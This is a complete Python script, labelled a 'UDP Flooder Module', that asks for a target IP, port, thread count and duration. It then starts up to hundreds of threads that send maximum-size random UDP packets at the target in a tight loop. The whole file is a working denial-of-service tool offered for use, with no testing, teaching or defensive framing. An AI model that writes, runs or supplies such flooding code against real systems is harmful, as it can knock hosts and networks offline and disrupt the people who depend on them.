#!/usr/bin/env python3
# UDP Flooder Module

import socket, random, time, threading

def run():
    print("\n" + "="*60)
    print("UDP FLOODER")
    print("="*60)
    
    target_ip = input("Target IP: ").strip()
    target_port = int(input("Target Port: ").strip() or "80")
    threads = int(input("Threads [500]: ").strip() or "500")
    duration = int(input("Duration (seconds) [60]: ").strip() or "60")
    
    packet_size = 65500
    stop_event = threading.Event()
    
    def flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        data = random._urandom(packet_size)
        end_time = time.time() + duration
        while time.time() < end_time and not stop_event.is_set():
            try:
                sock.sendto(data, (target_ip, target_port))
            except:
                pass
        sock.close()
    
    print(f"Starting UDP flood on {target_ip}:{target_port}")
    print(f"Threads: {threads} | Duration: {duration}s")
    
    for i in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    
    time.sleep(duration)
    stop_event.set()
    print("UDP flood completed!")

if __name__ == "__main__":
    run()